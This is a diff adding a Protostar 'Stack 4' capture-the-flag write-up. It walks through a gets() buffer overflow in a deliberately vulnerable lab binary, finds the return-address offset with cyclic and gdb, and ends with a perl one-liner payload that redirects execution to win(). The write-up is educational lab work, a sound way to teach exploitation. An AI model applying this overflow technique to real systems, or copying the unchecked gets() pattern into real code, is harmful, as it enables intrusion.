@@ -412,3 +412,112 @@ code flow successfully changed
 ```
 
 We solved it :D
+
+## Stack 4
+
+### Challenge description
+
+Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
+
+This level is at `/opt/protostar/bin/stack4`
+
+Hints
+
++ A variety of introductory papers into buffer overflows may help.
++ gdb lets you do “run < input”
++ EIP is not directly after the end of buffer, compiler padding can also increase the size.
+
+### Challenge source code
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+### Challenge solution
+
+In this level, we are provided with a very short source code. It seems like there is no way to call the win function.
+
+To illustrate how the attack is going to work, you need to understand how the stack works.
+
+Let's use the above code as example.
+
+When main is called, here is how the stack would look like :
+
+<img src="/../assets/protostar_stack0_main_stackframe.png" />
+
+Now the critical thing here is the `return address`.
+
+Basically, when main is finished, the `return address` is popped from the stack into the `EIP` or the instruction pointer.
+
+The instruction pointer points to the instruction that the CPU is going to execute.
+
+If we somehow modify the return address, we can redirect the program flow into the `win` function.
+
+All we need to know is how many bytes we need to reach the return address.
+
+We can test this by using `cyclic` and `gdb`.
+
+> cyclic is a pattern generator program that allows us to generate a number of characters following a pattern.
+
+Let's generate 100 characters.
+
+```bash
+┌──(yariss㉿Kali-VM)-[~]
+└─$ cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+```
+
+Now let's run gdb and give this as input.
+
+```bash
+Starting program: /opt/protostar/bin/stack4 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x61616174 in ?? ()
+```
+
+Yes, when you get segmentation fault, it means that the program tried to jump to a memory location that doesn't exist / you aren't allowed to jump to.
+
+Notice that the program tried to jump to `0x61616174`, which is `aaat`
+
+Since we used `cyclic` to generate the pattern, we can determine how many bytes until the first occurence of that pattern.
+
+```bash
+└─$ cyclic -l 0x61616174
+76
+```
+
+We got the offset ! Now all we need to do is determine the address of `win` and use the same payload as before.
+
+```bash
+(gdb) p win
+$1 = {void (void)} 0x80483f4 <win>
+```
+
+It's time to smash the stack !
+
+```bash
+user@protostar:/opt/protostar/bin$ perl -e 'print "A" x 76 . "\xf4\x83\x04\x08"' | ./stack4
+code flow successfully changed
+Segmentation fault
+```
+
+We solved it :D
+
+
+
